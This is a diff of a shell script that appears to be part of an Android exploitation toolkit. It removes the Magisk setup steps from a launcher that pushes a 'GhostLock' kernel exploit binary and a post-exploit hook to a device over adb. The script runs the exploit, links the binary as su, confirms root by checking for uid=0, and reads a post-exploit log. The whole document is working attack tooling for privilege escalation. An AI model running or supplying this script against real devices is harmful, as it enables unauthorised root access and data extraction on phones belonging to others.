@@ -45,48 +45,26 @@ if [ ! -f "$EXPLOIT_BIN" ]; then
     fi
 fi
 
-# 3. Check / Fetch Magisk files
-echo "[3/6] Verifying Magisk in-RAM binaries..."
-if [ ! -f "$BIN_DIR/magisk" ] || [ ! -f "$BIN_DIR/magiskpolicy" ]; then
-    echo "[*] Fetching Magisk binaries..."
-    bash "$SCRIPT_DIR/get_magisk.sh"
-fi
-
-# 4. Push payload to device
-echo "[4/6] Pushing payload to /data/local/tmp..."
+# 3. Push payload to device
+echo "[3/5] Pushing payload to /data/local/tmp..."
 adb push "$EXPLOIT_BIN" /data/local/tmp/gl
-adb push "$BIN_DIR/magisk" /data/local/tmp/magisk
-adb push "$BIN_DIR/magiskpolicy" /data/local/tmp/magiskpolicy
 adb push "$SCRIPT_DIR/post_exploit.sh" /data/local/tmp/post_exploit.sh
 
-adb shell "chmod 755 /data/local/tmp/gl /data/local/tmp/magisk /data/local/tmp/magiskpolicy /data/local/tmp/post_exploit.sh"
+adb shell "chmod 755 /data/local/tmp/gl /data/local/tmp/post_exploit.sh && ln -sf /data/local/tmp/gl /data/local/tmp/su"
 
-# Install Magisk Manager APK if available and not installed
-if [ -f "$BIN_DIR/Magisk.apk" ]; then
-    if ! adb shell pm list packages | grep -q "com.topjohnwu.magisk"; then
-        echo "[*] Installing Magisk Manager app on device..."
-        adb install -r "$BIN_DIR/Magisk.apk" || true
-    fi
-fi
-
-# 5. Run the exploit
-echo "[5/6] Triggering GhostLock kernel exploit..."
+# 4. Run the exploit
+echo "[4/5] Triggering GhostLock kernel exploit..."
 echo "[*] Running /data/local/tmp/gl (device may take a few moments)..."
 adb shell "/data/local/tmp/gl"
 
 # Give post-exploit hook a couple of seconds to finish
 sleep 2
 
-# 6. Check results and pull dump
-echo "[6/6] Verifying root status..."
+# 5. Check results and pull dump
+echo "[5/5] Verifying root status..."
 if adb shell "/data/local/tmp/su -c id" 2>/dev/null | grep -q "uid=0"; then
     echo "[SUCCESS] Root access confirmed via /data/local/tmp/su!"
     
-    # Check Magisk daemon
-    if adb shell "/data/local/tmp/su -c ps -A" 2>/dev/null | grep -q "magiskd"; then
-        echo "[SUCCESS] Magisk daemon is running in RAM!"
-    fi
-
     # Display post-exploit log
     echo "--- Post-Exploit Log ---"
     adb shell "cat /data/local/tmp/post_exploit.log 2>/dev/null" || true
